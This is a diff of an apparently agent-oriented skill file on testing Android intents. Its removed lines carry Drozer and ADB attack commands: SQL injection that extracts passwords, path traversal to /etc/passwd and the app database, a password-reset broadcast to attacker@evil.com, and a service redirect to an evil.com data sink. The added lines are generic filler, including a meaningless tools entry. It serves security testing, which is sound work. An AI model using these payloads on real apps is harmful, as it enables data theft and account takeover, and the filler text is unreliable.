@@ -24,7 +24,7 @@ nist_csf:
 - ID.RA-01
 - DE.CM-09
 ---
-# Testing Android Intents for Vulnerabilities
+# Testing Android Intents For Vulnerabilities
 
 ## When to Use
 
@@ -46,182 +46,24 @@ Use this skill when:
 
 ## Workflow
 
-1. **Scope the task** — define objectives, boundaries, and success criteria
-2. **Gather information** — collect all necessary data and context before proceeding
-3. **Execute the core workflow** — follow the domain-specific steps methodically
-4. **Validate results** — verify outputs against expected outcomes or baselines
-5. **Document findings** — record results, anomalies, and recommendations
-### Step 1: Enumerate Exported Components
+1. **Reconnaissance** — Gather information about the target related to android intents. Identify attack surface.
+2. **Vulnerability Identification** — Enumerate potential android intents weaknesses using automated and manual techniques.
+3. **Exploit Development/Selection** — Use vulnerabilities to identify and test android intents vulnerabilities.
+4. **Execution** — Execute the android intents test in a controlled manner with proper authorization.
+5. **Post-Exploitation** — Document the impact and extent of successful exploitation.
+6. **Reporting** — Write detailed findings with reproduction steps, impact assessment, and remediation guidance.
 
-```bash
-# Using Drozer
-drozer console connect
-run app.package.info -a com.target.app
-run app.package.attacksurface com.target.app
+## Tools
 
-# Output shows:
-# X activities exported
-# X broadcast receivers exported
-# X content providers exported
-# X services exported
-
-# List exported activities
-run app.activity.info -a com.target.app
-
-# List exported services
-run app.service.info -a com.target.app
-
-# List exported receivers
-run app.broadcast.info -a com.target.app
-
-# List content providers
-run app.provider.info -a com.target.app
-```
-
-### Step 2: Test Exported Activities
-
-```bash
-# Launch exported activities directly
-run app.activity.start --component com.target.app com.target.app.AdminActivity
-
-# Launch with intent extras
-run app.activity.start --component com.target.app com.target.app.ProfileActivity \
-  --extra string user_id 1337
-
-# Test intent injection via data URI
-adb shell am start -a android.intent.action.VIEW \
-  -d "content://com.target.app/users/admin" com.target.app
-
-# If admin activity opens without auth, report as authorization bypass
-```
-
-### Step 3: Test Broadcast Receivers
-
-```bash
-# Send broadcast to exported receivers
-run app.broadcast.send --action com.target.app.PROCESS_PAYMENT \
-  --extra string amount "0.01" --extra string recipient "attacker"
-
-# Sniff broadcasts for sensitive data
-run app.broadcast.sniff --action com.target.app.USER_LOGIN
-
-# Via ADB
-adb shell am broadcast -a com.target.app.RESET_PASSWORD \
-  --es email "attacker@evil.com"
-```
-
-### Step 4: Test Content Providers
-
-```bash
-# Query content providers for data leakage
-run app.provider.query content://com.target.app.provider/users
-run app.provider.query content://com.target.app.provider/users --projection "password"
-
-# Test SQL injection in content providers
-run app.provider.query content://com.target.app.provider/users \
-  --selection "1=1) UNION SELECT username,password FROM users--"
-
-# Test path traversal
-run app.provider.read content://com.target.app.provider/../../etc/passwd
-run app.provider.download content://com.target.app.provider/../databases/app.db /tmp/stolen.db
-
-# Find injectable providers
-run scanner.provider.injection -a com.target.app
-run scanner.provider.traversal -a com.target.app
-```
-
-### Step 5: Test Pending Intent Vulnerabilities
-
-```javascript
-// Monitor PendingIntent creation via Frida
-Java.perform(function() {
-    var PendingIntent = Java.use("android.app.PendingIntent");
-
-    PendingIntent.getActivity.overload("android.content.Context", "int",
-        "android.content.Intent", "int").implementation =
-        function(context, requestCode, intent, flags) {
-            console.log("[PendingIntent] getActivity:");
-            console.log("  Intent: " + intent.toString());
-            console.log("  Flags: " + flags);
-
-            // Check for FLAG_IMMUTABLE (secure) vs FLAG_MUTABLE (vulnerable)
-            var FLAG_MUTABLE = 0x02000000;
-            if ((flags & FLAG_MUTABLE) !== 0) {
-                console.log("  [VULN] FLAG_MUTABLE - PendingIntent can be modified by receiver");
-            }
-            return this.getActivity(context, requestCode, intent, flags);
-        };
-});
-```
-
-### Step 6: Test Service Binding
-
-```bash
-# Attempt to bind to exported services
-run app.service.start --action com.target.app.SYNC_SERVICE \
-  --extra string server "https://evil.com/data_sink"
-
-run app.service.send com.target.app com.target.app.MessengerService \
-  --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
-```
-
-## Key Concepts
-
-| Term | Definition |
-|------|-----------|
-| **Exported Component** | Android component (activity/service/receiver/provider) accessible to other apps on the device |
-| **Intent** | Messaging object for requesting actions from other components; can be explicit (target specified) or implicit (action-based) |
-| **Pending Intent** | Token wrapping an intent for future execution by another app; mutable PendingIntents can be modified by recipients |
-| **Content Provider** | Component for structured data sharing between apps; SQL injection target if query parameters are not sanitized |
-| **Broadcast Receiver** | Component receiving system or app broadcasts; exported receivers can be triggered by any app |
-
-## When NOT to Use
-
-- You need to perform real attacks, not test (use performing-* skills)
-- Task is about analyzing test results (use analyzing-* skills)
-- You need to implement test infrastructure (use implementing-* skills)
-- Task is about building test tools (use building-* skills)
-- You don't have test environment access
-- Task requires compliance validation (use auditing-* skills)
-
-
-## Red Flags
-
-- Performing actions without explicit written authorization from the asset owner
-- Testing against production systems without a defined scope and rules of engagement
-- Testing without rate limiting, potentially causing service degradation
-- Storing sensitive test data (credentials, tokens) in plain text logs
-- Using automated scanners blindly without reviewing results for false positives
+- **vulnerabilities** — Primary tool for this skill
+- **Vulnerability Scanner** — Automated weakness identification
+- **Exploitation Framework** — Controlled exploitation testing
+- **Reporting Tool** — Findings documentation and tracking
 
 ## Verification
 
-- All steps executed successfully against a test environment before production use
-- Output documented with screenshots or logs demonstrating expected behavior
-- Vulnerabilities reproduced with proof-of-concept and impact analysis
-- False positives filtered out through manual verification
-- Fix recommendations include code-level remediation guidance
-
-## Tools & Systems
-
-- **Drozer**: Android security assessment framework for IPC testing with pre-built modules
-- **ADB**: Command-line tool for invoking intents, starting activities, and sending broadcasts
-- **Frida**: Runtime monitoring of intent handling and PendingIntent creation
-- **apktool**: APK decompilation for AndroidManifest.xml analysis of component export status
-- **Intent Fuzzer**: Automated tool for fuzzing intent parameters across exported components
-
-## Common Pitfalls
-
-- **android:exported default changed in API 31**: Components with intent filters default to exported=true below API 31 but exported=false at API 31+. Check targetSdkVersion.
-- **Permission-protected components**: An exported component may still require a permission. Test with and without the required permission.
-- **Implicit intents vs explicit**: Only implicit intents (action-based) are interceptable by other apps. Explicit intents (specifying target) are secure.
-- **Custom permissions**: Apps can define custom permissions with different protection levels (normal, dangerous, signature). Signature-level permissions are only grantable to apps signed with the same certificate.
-
-## Overview
-
-> Section content — see SKILL.md body for full details.
-
-## Process
-
-1. Analyze the task requirements
-2. Apply domain expertise
-3. Verify output quality
+- [ ] All android intents procedures executed completely and documented
+- [ ] Findings validated against multiple data sources
+- [ ] False positives identified and filtered
+- [ ] Results documented with evidence and timestamps
+- [ ] Recommendations provided with risk-based prioritization
